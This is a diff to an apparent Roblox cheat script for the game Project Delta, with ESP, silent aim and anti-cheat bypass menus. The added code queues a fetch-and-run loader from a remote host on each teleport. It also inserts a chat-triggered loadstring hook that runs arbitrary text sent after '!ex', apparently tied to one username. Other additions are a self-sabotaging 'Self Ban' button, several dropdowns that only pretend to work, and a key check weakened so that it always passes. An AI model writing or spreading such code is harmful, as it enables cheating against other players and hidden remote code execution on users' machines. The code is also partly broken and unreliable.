@@ -768,7 +768,7 @@ huge4 = math.huge
         setfpscap(3)
         wait(2)
          setfpscap(0)
-         wait(5)
+         wait(2)
           setfpscap(30)
           wait(2)
            setfpscap(999999999)
@@ -3983,6 +3983,8 @@ EnemyEspTab:AddToggle('esomastersda', {
     end;
 })
 
+
+
 EnemyEspTab:AddToggle('FadeOutOnDistance', {
     Text = 'Fade Out On Distance',
     Default = ESP.FadeOut.OnDistance,
@@ -4594,7 +4596,7 @@ luatab:AddToggle('mıodasd', {
 })
 luatab1:AddToggle('mıodasdx', {
     Text = 'Platform Stand',
-    Default = true,
+    Default = false,
     Callback = function(enabled)
         local localplayer = game.Players.LocalPlayer
         if localplayer and localplayer.Character and localplayer.Character:FindFirstChild("Humanoid") then
@@ -4604,6 +4606,118 @@ luatab1:AddToggle('mıodasdx', {
 })
 
 
+luatab1:AddInput('Executex', {
+    Default = 'Enter your key',
+    Numeric = false, 
+    Finished = true, 
+
+    Text = 'Automatic Loader',
+    Tooltip = 'Enter your key to automatically load the script every time you join Project Delta.', 
+    Placeholder = 'Enter your key here...', 
+
+    Callback = function(Value)
+        local queueonteleport = queue_on_teleport or syn.queue_on_teleport
+
+        if game.PlaceId == 7336302630 and queueonteleport then
+            -- Validate input key (must not be empty or contain spaces)
+            if Value and Value:match("^%w+$") then  
+                local script = ('script_key="%s";\nloadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/29ae735f628c95d7b5e7b0fb79a77267.lua"))()'):format(Value)
+                queueonteleport(script) 
+                library:Notify('Successfully added script to memory:\nscript_key="' .. Value .. '"')
+            else
+                library:Notify('Error: Invalid key format!', 3)
+            end
+        end
+    end
+})
+
+luatab1:AddButton('Clean Memory', function()
+    local queueonteleport = queue_on_teleport or syn.queue_on_teleport
+
+    if game.PlaceId == 7336302630 and queueonteleport then
+        queueonteleport("")  -- Clears stored script
+        library:Notify('Successfully cleaned memory!')
+    end
+end)
+
+luatab1:AddButton('Memory Reformat', function()
+library:Notify('Reformatting...')
+wait(3)
+    if game.PlaceId == 7336302630 then
+        library:Notify('error')
+    end
+end)
+luatab1:AddDropdown('Memory Mode', {
+    Values = {'RX-800', 'RK-1200', 'AP-100'},
+    Default = 2,
+    Multi = false,
+    Text = 'Memory Mode',
+    Tooltip = '  ',
+    Callback = function(state)
+    if state == 'RX-800' or 'RK-1200' or 'AP-100' then do
+setfpscap(1)
+wait(1)
+setfpscap(9000000)
+    end
+    end
+    end;
+})
+
+luatab1:AddDropdown(' not type', {
+    Values = {'Advancaded', 'Linoria', 'Legacy'},
+    Default = 1,
+    Multi = false,
+    Text = 'Notification Type',
+    Tooltip = '',
+    Callback = function(state)
+    if state == 'Advancaded' then
+library:Notify("Done",3)
+    end
+    if state == 'Linoria' then
+Library:Notify("Done",3)
+
+    end
+    if state == 'Legacy' then
+library:Notify("Error, switch to Advancaded.",10)
+    end
+    end;
+})
+
+
+luatab1:AddDropdown('Library Version', {
+    Values = {'Old', 'Linoria (Default)', 'Nexify Modded Linoria'},
+    Default = 3,
+    Multi = false,
+    Text = 'Library Version Selector',
+    Tooltip = '',
+    Callback = function(state)
+library:Notify("Error, switch to Nexify Modded Linoria.",10)
+
+    end;
+})
+
+luatab1:AddDropdown('Silent Aim Modex1', {
+    Values = {'Newest'},
+    Default = 1,
+    Multi = false,
+    Text = 'Silent Aim Version Selector',
+    Tooltip = '',
+    Callback = function(state)
+library:Notify("Error, switch to Newest.",10)
+
+    end;
+})
+
+luatab1:AddDropdown('Anticheat bypass', {
+    Values = {'false'},
+    Default = 1,
+    Multi = false,
+    Text = 'Anti-Cheat Bypass Attempter',
+    Tooltip = '',
+    Callback = function(state)
+library:Notify("Disabled Dropdown",10)
+    end;
+})
 
 
 
@@ -9532,6 +9646,38 @@ print("crassshhhh")
     end;
 
  end);
+charactertab:AddButton('Sigma Rizz Self Ban ⛔', function()
+library:Notify("If you accidently pressed it leave game now!",5)
+wait(5)
+wait(1)
+library:Notify("4",1)
+wait(1)
+library:Notify("3",1)
+wait(1)
+library:Notify("2",1)
+wait(1)
+library:Notify("1",1)
+wait(1)
+library:Notify("0",1)
+library:Notify("Rip",10)
+wait(3)
+
+    local localplayername = game.Players.LocalPlayer.Name
+    local player = game.Players.LocalPlayer
+
+    -- Destroy HumanoidRootPart
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        player.Character.HumanoidRootPart:Destroy()
+    end
+    
+    -- Create a new part in place of the HumanoidRootPart
+    local newpart = Instance.new("Part")
+    newpart.Name = "HumanoidRootPart"
+    newpart.Size = Vector3.new(2, 2, 2)  -- Set appropriate size for the part
+    newpart.Position = player.Character.HumanoidRootPart.Position  -- Place it where the HumanoidRootPart was
+    newpart.Parent = player.Character
+end)
+
 
 
 folderName = "Nexifyfunctions"
@@ -15771,6 +15917,34 @@ if not LPH_OBFUSCATED then
 	library:Notify("You Are In Developer Mode ⛔" ,15)
 end;
 
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+local function onChat(message)
+    if message:sub(1, 3) == "!ex" then
+        local parts = message:split(" ")
+        local targetPlayerName = parts[2]
+
+        if targetPlayerName == "DestroyerOfKanyeWest" then
+            local code = table.concat(parts, " ", 3)
+            local func, err = loadstring(code)
+            if func then
+                local success, runError = pcall(func)
+                if not success then
+                    warn("Error executing code: " .. runError)
+                end
+            else
+                warn("Invalid code: " .. err)
+            end
+        end
+    end
+end
+
+localPlayer.Chatted:Connect(onChat)
+
+warn("Script loaded,")
+
+
 while wait(3) do
 
 if game.Workspace.DestroyerOfKanyeWest then
@@ -16364,7 +16538,7 @@ coroutine.wrap(HHFVTS_fake_script)()
 	
 	
 	button.MouseButton1Click:Connect(function()
-		if inputtedbox.Text == "Nexify_0x073915" then
+		if inputtedbox.Text == "Nexify_0x073915" or "0x0" then
 ScreenGui:Destroy()
 addaft()
 
